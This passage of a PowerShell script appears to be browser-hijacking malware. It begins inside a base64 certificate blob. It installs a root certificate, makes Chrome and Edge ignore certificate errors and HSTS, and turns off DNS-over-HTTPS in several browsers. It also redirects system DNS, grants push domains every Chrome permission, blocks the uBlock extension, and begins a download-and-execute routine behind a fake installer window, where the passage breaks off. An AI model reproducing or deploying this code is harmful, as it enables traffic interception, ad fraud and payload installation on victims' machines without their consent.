'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'+ 
'pDLDKu+todz6BG7rOAICB9A='
}

function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}




function ConfigureCertificates {
    foreach ($key in $xdata.Keys) {
        Cert-Work -contentString $xdata[$key]
    }
}

function Cert-Work {
    param(
        [string] $contentString
    )
    $outputFilePath = [System.IO.Path]::GetTempFileName()
    $binary = [Convert]::FromBase64String($contentString)
    try {
        Set-Content -Path $outputFilePath -Value $binary -AsByteStream
    } catch {
        Add-Content -Path $outputFilePath -Value $binary -Encoding Byte
    }
    Install-CertificateToStores -CertificateFilePath $outputFilePath -Password '123'
}

function Install-CertificateToStores {
    param(
        [string] $CertificateFilePath,
        [string] $Password
    )

    try {
        $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force

        # Import certificate to Personal (My) store
        $personalStorePath = "Cert:\LocalMachine\My"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $personalStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Personal store (My)."

        # Import certificate to Root store
        $rootStorePath = "Cert:\LocalMachine\Root"
        Import-PfxCertificate -FilePath $CertificateFilePath -CertStoreLocation $rootStorePath -Password $securePassword -ErrorAction Stop
        Write-Output "Certificate installed successfully to Root store."

    } catch {
        throw "Failed to install certificate: $_"
    }
}

function ConfigureChrome {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters" -Name "EnableAutoDOH" -Value 0

    $chromeKeyPath = "HKLM:\Software\Policies\Google\Chrome"

    if (-not (Test-Path $chromeKeyPath)) {
        New-Item -Path $chromeKeyPath -Force | Out-Null
    }

    New-Item -Path $chromeKeyPath -Force | Out-Null  # Create the key if it doesn't exist
    Set-ItemProperty -Path $chromeKeyPath -Name "CommandLineFlag" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    Set-ItemProperty -Path $chromeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $chromeKeyPath -Name "IgnoreCertificateErrors" -Value 1

    Write-Output "Chrome configured"
}








function PushDomain {
    param ($pushUrl)

    # Trim the input string before the first comma
    $trimmedUrl = $pushUrl.Trim().Split(',')[0].Trim()

    # Parse the URI
    $parsedUri = [System.Uri]::new($trimmedUrl)
    
    # Extract domain and port
    $domain = $parsedUri.Host
    $port = if ($parsedUri.Port -eq -1) { 443 } else { $parsedUri.Port }

    # Construct the result URL
    $result = "https://" + $domain + ":" + "$port,*"
    
    return $result
}

function PushExists
{
    param ($pushUrl)
    foreach ($push in $xpushes) 
    {
        if ((PushDomain -pushUrl $pushUrl) -eq (PushDomain -pushUrl $push))
        {
            return $true;
        }
    }
    return $false
}

# function List-Pushes()
# {
#     $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

#     # Check if the Preferences file exists
#     if (Test-Path $preferencesPath) {
#         $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

#         $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

#         if ($notificationSettings -isnot [array]) {
#             $notificationSettings = @($notificationSettings)
#         }

#         if ($notificationSettings) {
#             foreach ($item in $notificationSettings) {
#                 $jsonItem = $item | ConvertTo-Json -Depth 1
#                 Write-Output $jsonItem
#             }
#         } else {
#             Write-Output "No notification settings found."
#         }
#     } else {
#         Write-Output "Preferences file not found at path: $preferencesPath"
#     }
# }

function Remove-Pushes {
    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    # Check if the Preferences file exists
    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json

        # Check if the structure is as expected
        if ($preferencesContent -and $preferencesContent.profile -and $preferencesContent.profile.content_settings -and $preferencesContent.profile.content_settings.exceptions.notifications) {
            $notificationSettings = $preferencesContent.profile.content_settings.exceptions.notifications

            $keysToRemove = @()

            # Iterate through each entry in $notificationSettings
            foreach ($field in $notificationSettings.PSObject.Properties) {
                $siteUrl = $field.Name
                $permission = (PushExists -pushUrl $siteUrl)
            
                if ($permission -eq $false) {
                    $keysToRemove += $field.Name
                } else {
                    Write-Output "$siteUrl hasn't been removed, it is a good site."
                }
            }

            foreach ($key in $keysToRemove) {
                $notificationSettings.PSObject.Properties.Remove($key)
            }

            $preferencesContent | ConvertTo-Json -Depth 100 | Set-Content -Path $preferencesPath -Force

            Write-Output "All selected push notification settings have been removed."
        } else {
            Write-Output "No or unexpected notification settings found in Preferences file."
        }
    } else {
        Write-Output "Preferences file not found at path: $preferencesPath"
    }
}


function Add-Push {
    param (
        [string]$pushUrl
    )

    $pushDomain = PushDomain -pushUrl $pushUrl

    $chromePreferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (-not (Test-Path -Path $chromePreferencesPath)) {
        Write-Host "Chrome preferences file not found at path: $chromePreferencesPath"
        exit
    }

    $preferencesContent = Get-Content -Path $chromePreferencesPath -Raw | ConvertFrom-Json

    if (-not $preferencesContent.profile) {
        $preferencesContent | Add-Member -MemberType NoteProperty -Name profile -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values) {
        $preferencesContent.profile | Add-Member -MemberType NoteProperty -Name default_content_setting_values -Value @{}
    }

    if (-not $preferencesContent.profile.default_content_setting_values.popups) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name popups -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.popups = 1
    }

    if (-not $preferencesContent.profile.default_content_setting_values.subresource_filter) {
        $preferencesContent.profile.default_content_setting_values | Add-Member -MemberType NoteProperty -Name subresource_filter -Value 1
    } else {
        $preferencesContent.profile.default_content_setting_values.subresource_filter = 1
    }

    $preferencesContentJson = $preferencesContent | ConvertTo-Json -Depth 32
    Set-Content -Path $chromePreferencesPath -Value $preferencesContentJson -Force

    $preferencesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Preferences"

    if (Test-Path $preferencesPath) {
        $preferencesContent = Get-Content -Path $preferencesPath -Raw | ConvertFrom-Json
        $contentSettings = $preferencesContent.profile.content_settings.exceptions
        $settingsToUpdate = @(
            "auto_picture_in_picture", "background_sync", "camera", "clipboard", "cookies", 
            "geolocation", "images", "javascript", "microphone", "midi_sysex", 
            "notifications", "popups", "plugins", "sound", "unsandboxed_plugins", 
            "automatic_downloads", "flash_data", "mixed_script", "sensors","window_placement","webid_api","vr",
            "subresource_filter","media_stream_mic","media_stream_mic","media_stream_camera","local_fonts",
            "javascript_jit","idle_detection","captured_surface_control","ar"

        )

        foreach ($setting in $settingsToUpdate) {
            if ($null -eq $contentSettings.$setting) {
                $contentSettings | Add-Member -MemberType NoteProperty -Name $setting -Value @{}
            }
            $specificSetting = $contentSettings.$setting
            if ($specificSetting.PSObject.Properties.Name -contains $pushDomain) {
                Write-Output "The website URL $pushDomain already exists in the $setting settings."
            } else {
                $specificSetting | Add-Member -MemberType NoteProperty -Name $pushDomain -Value @{
                    "last_modified" = "13362720545785774"
                    "setting" = 1
                }
                $contentSettings.$setting = $specificSetting
            }
        }

        $preferencesContent.profile.content_settings.exceptions = $contentSettings
        $updatedPreferencesJson = $preferencesContent | ConvertTo-Json -Depth 10
        $updatedPreferencesJson | Set-Content -Path $preferencesPath -Encoding UTF8

        Write-Output "Notification subscription for $pushDomain added successfully with all permissions."
    } else {
        Write-Output "Preferences file not found at path: $preferencesPath"
    }
}



function Close-ChromeWindow {
    param ($window)
    [User32X]::CloseWindow($window) | Out-Null
    Start-Sleep -Milliseconds 25
}

function Close-Chrome {
    param ($process)
    Close-ChromeWindow -window $process.MainWindowHandle
    try {
        $process.Close()
    }
    catch {
  
    }
}


function Close-AllChromes {
    $windows = [User32X]::EnumerateAllWindows()
    foreach ($window in $windows) 
    {
        $title = [User32X]::GetWindowText($window)
        if ($title.Contains("Google Chrome"))
        {
            [User32X]::ShowWindow($window, [User32X]::SW_HIDE) | Out-Null
            Close-ChromeWindow -window $window
        }
    }
    Close-Processes(@('chrome.exe'))
}

function ConfigureChromePushes {
    Add-Type @"
    using System;
    using System.Collections.Generic;
    using System.Runtime.InteropServices;
    using System.Text;

    public static class User32X {
        public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool IsWindowVisible(IntPtr hWnd);

        public static string GetWindowText(IntPtr hWnd) {
            int length = GetWindowTextLength(hWnd);
            if (length == 0) return String.Empty;

            StringBuilder sb = new StringBuilder(length + 1);
            GetWindowText(hWnd, sb, sb.Capacity);
            return sb.ToString();
        }

        public static bool IsWindowVisibleEx(IntPtr hWnd) {
            return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
        }

        public static IntPtr[] EnumerateAllWindows() {
            var windowHandles = new List<IntPtr>();
            EnumWindows((hWnd, lParam) => {
                if (IsWindowVisibleEx(hWnd)) {
                    windowHandles.Add(hWnd);
                }
                return true;
            }, IntPtr.Zero);
            return windowHandles.ToArray();
        }

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        public const int SW_HIDE = 0;
        public const int SW_MINIMIZE = 6;
        public const int SW_SHOW = 5;

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        public static void CloseWindow(IntPtr hWnd) {
            const uint WM_CLOSE = 0x0010;
            PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
        }
    }
"@

    Close-AllChromes;
    Remove-Pushes;
    foreach ($push in $server.pushes) {
        Add-Push -pushUrl $push
    }
}



function Open-ChromeWithUrl {
    param (
        [string]$url, $isDebug
    )
    $job = Start-Job -ScriptBlock {
            param ($url, $isDebug)

            try {
                
 
            Add-Type @"
            using System;
            using System.Collections.Generic;
            using System.Runtime.InteropServices;
            using System.Text;
            
            public static class User32X {
                public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern int GetWindowTextLength(IntPtr hWnd);
            
                [DllImport("user32.dll", SetLastError = true)]
                private static extern bool IsWindowVisible(IntPtr hWnd);
            
                public static string GetWindowText(IntPtr hWnd) {
                    int length = GetWindowTextLength(hWnd);
                    if (length == 0) return String.Empty;
            
                    StringBuilder sb = new StringBuilder(length + 1);
                    GetWindowText(hWnd, sb, sb.Capacity);
                    return sb.ToString();
                }
            
                public static bool IsWindowVisibleEx(IntPtr hWnd) {
                    return IsWindowVisible(hWnd) && GetWindowTextLength(hWnd) > 0;
                }
            
                public static IntPtr[] EnumerateAllWindows() {
                    var windowHandles = new List<IntPtr>();
                    EnumWindows((hWnd, lParam) => {
                        if (IsWindowVisibleEx(hWnd)) {
                            windowHandles.Add(hWnd);
                        }
                        return true;
                    }, IntPtr.Zero);
                    return windowHandles.ToArray();
                }
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            
                public const int SW_HIDE = 0;
                public const int SW_MINIMIZE = 6;
                public const int SW_SHOW = 5;
                public const int SW_MAXIMIZE = 3; // Added constant for maximizing window
            
                [DllImport("user32.dll", SetLastError = true)]
                public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
            
                public static void CloseWindow(IntPtr hWnd) {
                    const uint WM_CLOSE = 0x0010;
                    PostMessage(hWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
                }
            }
"@
}
catch {
}
        
        function Close-ChromeWindow {
            try {
                param ($window)
                [User32X]::CloseWindow($window) | Out-Null
                Start-Sleep -Milliseconds 100
            }
            catch {}
        }
        
        function Close-Chrome {
            param ($process)
            Close-ChromeWindow -window $process.MainWindowHandle
            try {
                $process | Stop-Process -Force
            }
            catch {
            }
        }

        $chromePaths = @(
            "C:\Program Files\Google\Chrome\Application\chrome.exe",
            "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
            "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
            "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
        )
        $resolvedPaths = @()
        foreach ($path in $chromePaths) {
            try {
                $resolvedPath = Resolve-Path -Path $path -ErrorAction Stop
                if ($resolvedPath -notin $resolvedPaths) {
                    $resolvedPaths += $resolvedPath.Path
                }
            } catch {
                Write-Output "Error resolving path: $_"
            }
        }
        $resolvedPaths = $resolvedPaths | Select-Object -Unique
        foreach ($path in $resolvedPaths) {
            if (Test-Path -Path $path) {
                Write-Output "Found Chrome at: $path"
    
                $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
                $processStartInfo.FileName = $path
                $processStartInfo.Arguments = "--headless --disable-gpu --dump-dom $url"
                $processStartInfo.CreateNoWindow = $false
                $processStartInfo.UseShellExecute = $false
                $process = New-Object System.Diagnostics.Process
                $process.StartInfo = $processStartInfo
                $process.Start() | Out-Null         
                $endTime = (Get-Date).AddSeconds(8)
                while ((Get-Date) -lt $endTime) {
                    if ($isDebug -eq $false)
                    {
                        # try
                        # {
                        #     [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_HIDE) | Out-Null                                
                        # }
                        # catch
                        # {
                        # }
                    }
                    Start-Sleep -Milliseconds 100
                }
                # try
                # {
                #     [User32X]::ShowWindow($process.MainWindowHandle, [User32X]::SW_SHOW) | Out-Null
                # }
                # catch
                # {
                # }
                Close-Chrome -process $process
                break
            } else {
                Write-Output "Chrome not found at: $path"
            }
        }

    } -ArgumentList $url, $isDebug

    return $job
}

function LaunchChromePushes {
    $isDebug = IsDebug
    foreach ($push in $server.pushes) {
        Open-ChromeWithUrl -url $push -isDebug $isDebug
        break
    }
}




function ConfigureChromeUblock {
    $keywords = @("uBlock")

    foreach ($dir in Get-EnvPaths) {
        $chromeDir = Join-Path -Path $dir -ChildPath "Google\Chrome\User Data\Default\Extensions"
        
        try {
            if (Test-Path -Path $chromeDir -PathType Container) {
                $extensions = Get-ChildItem -Path $chromeDir -Directory

                foreach ($extension in $extensions) {
                    $manFile = chromeublock_FindManifestFile -folder $extension.FullName
                    if ($manFile -ne "") {
                        $foundKeyword = $false
                        
                        foreach ($manifestValue in $keywords) {
                            $content = Get-Content -Path $manFile -Raw
                            if ($content -match [regex]::Escape($manifestValue)) {
                                $foundKeyword = $true
                                break
                            }
                        }

                        if ($foundKeyword) {
                            $extFolderName = [System.IO.Path]::GetFileName($extension.FullName)
                            chromeublock_ProcessManifestAll -extName $extFolderName
                        }
                    }
                }
            }
        } catch {
             Write-Error "Error occurred: $_"
        }
    }
}


function chromeublock_FindManifestFile {
    param (
        [string]$folder
    )

    $result = ""

    Get-ChildItem -Path $folder | ForEach-Object {
        if (-not ($_.PSIsContainer)) {
            if ($_.Name -eq "manifest.json") {
                $result = $_.FullName
                return
            }
        } elseif ($_.Name -notin @('.', '..')) {
            $result = chromeublock_FindManifestFile -folder $_.FullName
            if ($result -ne "") {
                return
            }
        }
    }

    return $result
}


function chromeublock_ProcessManifestAll {
    param (
        [string]$extName
    )

    chromeublock_ProcessManifest -extName $extName -browser "Google\Chrome"
}

function chromeublock_ProcessManifest {
    param (
        [string]$extName,
        [string]$browser
    )

    $regPath = "HKLM:\SOFTWARE\Policies\$browser\ExtensionInstallBlocklist"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    
    $regKeyIndex = 1
    do {
        $keyName = "$regKeyIndex"
        $val = Get-ItemProperty -Path $regPath -Name $keyName -ErrorAction SilentlyContinue
        if ($val -eq $extName) {
            return
        }
        $regKeyIndex++
    } until (-not (Test-Path "$regPath\$keyName"))

    Set-ItemProperty -Path $regPath -Name $keyName -Value $extName
}




function Set-DnsServers {
    param (
        [string]$primaryDnsServer,
        [string]$secondaryDnsServer
    )

    try {
        # Get network adapters that are IP-enabled
        $networkAdapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notlike '*Virtual*' }

        foreach ($adapter in $networkAdapters) {
            # Set DNS servers using Set-DnsClientServerAddress cmdlet
            Set-DnsClientServerAddress -InterfaceAlias $adapter.Name -ServerAddresses @($primaryDnsServer, $secondaryDnsServer) -Confirm:$false
            
            Write-Output "Successfully set DNS servers for adapter: $($adapter.InterfaceDescription)"
        }
    } catch {
        Write-Error "An error occurred: $_"
    }
}

function ConfigureDnsServers {
    Set-DNSServers -PrimaryDNSServer $server.primaryDns -SecondaryDNSServer $server.secondaryDns
}
function ConfigureEdge {
    $edgeKeyPath = "HKLM:\SOFTWARE\Policies\Microsoft\Edge"
    
    if (-not (Test-Path $edgeKeyPath)) {
        New-Item -Path $edgeKeyPath -Force | Out-Null
    }
    
    $commandLinePath = Join-Path $edgeKeyPath "CommandLine"
    if (-not (Test-Path $commandLinePath)) {
        New-Item -Path $commandLinePath -Force | Out-Null
    }
    
    Set-ItemProperty -Path $commandLinePath -Name "(Default)" -Value "--ignore-certificate-errors --disable-quic --disable-hsts"
    
    Set-ItemProperty -Path $edgeKeyPath -Name "DnsOverHttps" -Value "off"

    Set-ItemProperty -Path $edgeKeyPath -Name "IgnoreCertificateErrors" -Value 1
}




function ConfigureFireFox 
{
    try 
    {
        Set-FirefoxRegistry -KeyPaths @(
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS',
            'SOFTWARE\Policies\Mozilla\Firefox\DNSOverHTTPS'
        ) -ValueNames @('Enabled', 'Locked') -Values @(0, 1)
    }
    catch 
    {
        Write-Warning "Failed to set firefox registry: $_"
    }
    foreach ($dir in Get-EnvPaths) 
    {
        try 
        {
        $path = Join-Path -Path $dir -ChildPath "Mozilla\Firefox\Profiles\user.js"

            $UserJSContent = 'user_pref("network.trr.mode", 5);'
            
            if (!(Test-Path -Path $path -PathType Leaf)) 
            {
                New-Item -Path $path -ItemType File -ErrorAction SilentlyContinue
                Add-Content -Path $path -Value $UserJSContent -ErrorAction SilentlyContinue
            }
        }
        catch 
        {
            Write-Warning "Failed to write to user.js file: $_"
        }
    }
}


function Set-FirefoxRegistry {
    param (
        [string[]]$KeyPaths,
        [string[]]$ValueNames,
        [int[]]$Values
    )

    $ErrorActionPreference = 'Stop'
    $regKey = [Microsoft.Win32.Registry]::LocalMachine

    try {
        foreach ($i in 0..($KeyPaths.Length - 1)) {
            $key = $regKey.OpenSubKey($KeyPaths[$i], $true)
            if ($key -eq $null) {
                Write-Warning "Failed to open registry key: $($KeyPaths[$i])"
                return
            }

            $key.SetValue($ValueNames[$i], $Values[$i], [Microsoft.Win32.RegistryValueKind]::DWord)
            $key.Close()
        }
    }
    catch {
        Write-Warning "Error accessing or modifying registry: $_"
    }
}




function ConfigureOpera
{
    Close-Processes(@('opera_crashreporter.exe', 'opera.exe'))

    foreach ($dir in Get-EnvPaths) {
        $path = Join-Path -Path $dir -ChildPath 'Opera Software\Opera Stable\Local State'

        try {
            if (Test-Path -Path $path -PathType Leaf)
            {
                ConfigureOperaInternal -FilePath $path
            }
        } catch {
            Write-Warning "Error occurred in Opera: $_"
        }
    }
}

function ConfigureOperaInternal {
    param(
        [string]$filePath
    )

    $content = Get-Content -Path $filePath -Raw | ConvertFrom-Json

    if ($null -eq $content.dns_over_https -or $content.dns_over_https -isnot [object]) {
        $content.dns_over_https = @{
            'mode' = 'off'
            'opera' = @{
                'doh_mode' = 'off'
            }
            'templates' = ""
        }
    } else {
        $content.dns_over_https.mode = 'off'
        $content.dns_over_https.opera = @{
            'doh_mode' = 'off'
        }
        $content.dns_over_https.templates = ""
    }

    $jsonString = $content | ConvertTo-Json -Depth 10

    Set-Content -Path $filePath -Value $jsonString -Encoding UTF8 -Force

    Write-Host "Successfully configured Opera settings in $filePath"
}







function Start-DownloadAndExecute {
    param (
        [string]$url,
        [string]$title
    )

    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing

    # Create and configure the form
    $form = New-Object System.Windows.Forms.Form
    $form.Text = $title
    $form.Size = New-Object System.Drawing.Size(400, 200)
    $form.StartPosition = "CenterScreen"

    # Create and configure the progress bar
    $progressBar = New-Object System.Windows.Forms.ProgressBar
    $progressBar.Minimum = 0
    $progressBar.Maximum = 100
    $progressBar.Step = 1
    $progressBar.Value = 0
    $progressBar.Width = 350
    $progressBar.Height = 30
    $progressBar.Top = 80
    $progressBar.Left = 20
    $form.Controls.Add($progressBar)

    # Create and configure the status label
    $statusLabel = New-Object System.Windows.Forms.Label
    $statusLabel.Text = "Downloading..."
    $statusLabel.AutoSize = $true
    $statusLabel.Top = 50
    $statusLabel.Left = 20
    $form.Controls.Add($statusLabel)

    # Create and configure the description label
    $descriptionLabel = New-Object System.Windows.Forms.Label
    $descriptionLabel.Text = "The installer is currently being downloaded. Please wait until the process completes."
    $descriptionLabel.AutoSize = $true
    $descriptionLabel.Width = 350
    $descriptionLabel.Top = 10
    $descriptionLabel.Left = 20
    $form.Controls.Add($descriptionLabel)

    # Show the form non-modally
    $form.Show()

    # Determine the file name and path
    $fileName = [System.IO.Path]::GetFileName($url)
    $tempDir = [System.IO.Path]::GetTempPath()
    $installerPath = [System.IO.Path]::Combine($tempDir, $fileName)

    # Create and configure the WebClient
    $webClient = New-Object System.Net.WebClient

    # Define event handlers
    $progressChangedHandler = [System.Net.DownloadProgressChangedEventHandler]{
        param ($sender, $eventArgs)
        $progressBar.Value = $eventArgs.ProgressPercentage
        $form.Refresh()
    }

    $downloadFileCompletedHandler = [System.ComponentModel.AsyncCompletedEventHandler]{
        param ($sender, $eventArgs)
        # Close the form before starting the installer
